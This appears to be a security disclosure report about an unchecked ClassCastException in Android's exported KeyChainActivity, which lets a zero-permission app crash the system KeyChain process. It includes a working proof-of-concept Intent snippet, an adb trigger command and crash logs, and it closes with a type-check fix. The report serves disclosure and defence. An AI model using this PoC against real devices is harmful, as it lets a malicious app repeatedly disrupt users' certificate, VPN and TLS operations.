# com.android.keychain — Unhandled ClassCastException in `KeyChainActivity` Crashes the System-UID KeyChain Process (Zero-Permission Denial of Service)

## Summary

`com.android.keychain.KeyChainActivity` is exported with the action `com.android.keychain.CHOOSER` and no manifest permission. It reads an optional `"issuers"` `Serializable` extra from the launching `Intent` and passes it straight into `CertificateParametersFilter`, which iterates every element and unconditionally casts it to `byte[]`:

```java
for (int i = 0; i < size; i++) {
    Object obj = arrayList.get(i);
    byte[] bArr = (byte[]) obj;   // KeyChainActivity.java:407 — no instanceof check
    ...
}
```

Because the `"issuers"` extra is attacker-controlled and its element type is never validated, a zero-permission app can supply an `ArrayList` containing anything other than a `byte[]` (a single `String` is enough) to make this cast throw a `ClassCastException`. The exception is never caught, propagates out of `Activity.onResume()`, and crashes the entire `com.android.keychain` process — the same OS process that also hosts `KeyChainService`, the system-wide binder every app uses for certificate/private-key operations.

## Severity: MEDIUM

- **Attack vector**: Local (malicious app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None — no chooser, no dialog, fully silent trigger
- **CIA impact**: Availability — a zero-permission app can repeatedly and reliably crash the system-uid `com.android.keychain` process on demand, producing a persistent "Key Chain keeps stopping" system dialog and disrupting any concurrent KeyChain/certificate operation (e.g. VPN or TLS-mutual-auth client cert selection) system-wide for the crash/restart window.

## Affected Component

- **Package**: `com.android.keychain` (`uid=android.uid.system`)
- **Activity**: `com.android.keychain.KeyChainActivity`
- **Crash site**: `com.android.keychain.KeyChainActivity$CertificateParametersFilter.<init>` (`KeyChainActivity.java:407`), reached from `chooseCertificate()` (`:239`) called from `onResume()` (`:176`)

```xml
<activity android:name="com.android.keychain.KeyChainActivity" android:exported="true" ...>
    <intent-filter>
        <action android:name="com.android.keychain.CHOOSER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

No `android:permission` attribute — reachable by any installed app regardless of permissions.

- **Tested on**: Pixel 6a, Android 17 Beta (API 37), September 2026 (`com.android.keychain` versionCode 37)

## Proof of Concept

### Attacker App (com.vrp.zeroperm)

Holds **zero** Android permissions. Sends a single malformed `Intent` extra:

```java
ArrayList<Object> issuers = new ArrayList<>();
issuers.add("not-a-byte-array");   // any non-byte[] element works

Intent intent = new Intent("com.android.keychain.CHOOSER");
intent.setComponent(new ComponentName("com.android.keychain", "com.android.keychain.KeyChainActivity"));
intent.putExtra("issuers", issuers);
intent.putExtra("key_types", new String[0]);
startActivity(intent);
```

### Reproduction Steps

1. Install the PoC APK (`poc.apk`) — holds **zero** Android permissions.
2. Trigger the crash:
   ```
   adb shell am start -n com.vrp.zeroperm/.KeychainDeserDosActivity --ez minimal true
   ```
3. `com.android.keychain` crashes immediately with a `FATAL EXCEPTION`; the OS displays "Key Chain keeps stopping".

### Runtime Proof (logcat)

```
E AndroidRuntime: FATAL EXCEPTION: main
E AndroidRuntime: Process: com.android.keychain, PID: 28584
E AndroidRuntime: java.lang.RuntimeException: Unable to resume activity {com.android.keychain/com.android.keychain.KeyChainActivity}
E AndroidRuntime: 	at android.app.ActivityThread.performResumeActivity(ActivityThread.java:6200)
...
E AndroidRuntime: Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
E AndroidRuntime: 	at com.android.keychain.KeyChainActivity$CertificateParametersFilter.<init>(KeyChainActivity.java:407)
E AndroidRuntime: 	at com.android.keychain.KeyChainActivity.chooseCertificate(KeyChainActivity.java:239)
E AndroidRuntime: 	at com.android.keychain.KeyChainActivity.onResume(KeyChainActivity.java:176)
```

System reaction, confirmed via `dumpsys activity activities`:
```
mFocusedWindow=Window{... u0 Application Error: com.android.keychain}
```
(full trace in `logcat_crash_trace.txt`; crash dialog screenshot in `screen_keychain_keeps_stopping.png`, captured after repeated triggers producing the aggregated "Key Chain keeps stopping" dialog).

The crash is 100% reliable and reproducible with a single Intent send — no timing, no race, no special device state required.

## Impact

### Availability
- **On-demand system process crash**: any installed zero-permission app can kill `com.android.keychain` (system uid) at will, any number of times, with a single `startActivity()` call.
- **Shared-process blast radius**: `KeyChainService` (the AIDL backend used by every app for `KeyChain.choosePrivateKeyAlias`, VPN client-cert lookups, mutual-TLS auth, etc.) runs in the **same process**. While the crash is isolated to the activity's call stack and the process auto-restarts, any app mid-flight on a KeyChain/certificate operation at the moment of the crash has its request killed, and the visible "Key Chain keeps stopping" dialog disrupts the user experience of whatever legitimate flow (e.g. VPN setup, corporate device enrollment, browser client-cert prompt) triggered a KeyChain interaction around the same time.
- **Repeatable annoyance/DoS primitive**: a malicious app could loop this call to keep the system in a degraded state, repeatedly surfacing the system crash dialog and interrupting the user.

## Recommended Fix

Validate element types before casting in `CertificateParametersFilter`:

```java
for (int i = 0; i < size; i++) {
    Object obj = arrayList.get(i);
    if (!(obj instanceof byte[])) {
        Log.w("KeyChain", "Skipping invalid issuer element: " + (obj == null ? "null" : obj.getClass()));
        continue;
    }
    byte[] bArr = (byte[]) obj;
    ...
}
```

More generally, wrap the entire `chooseCertificate()` extras-parsing path (which already handles malformed `X500Principal` bytes with a try/catch for `IllegalArgumentException`) in defensive type-checking for every attacker-controlled `Serializable`/`Parcelable` extra, since `KeyChainActivity` is exported and reachable by any app.

## Files Attached

- `poc.apk` — Zero-permission PoC app
- `KeychainDeserDosActivity.java` — PoC source
- `logcat_crash_trace.txt` — Full crash stack trace
- `screen_keychain_keeps_stopping.png` — System "Key Chain keeps stopping" crash dialog
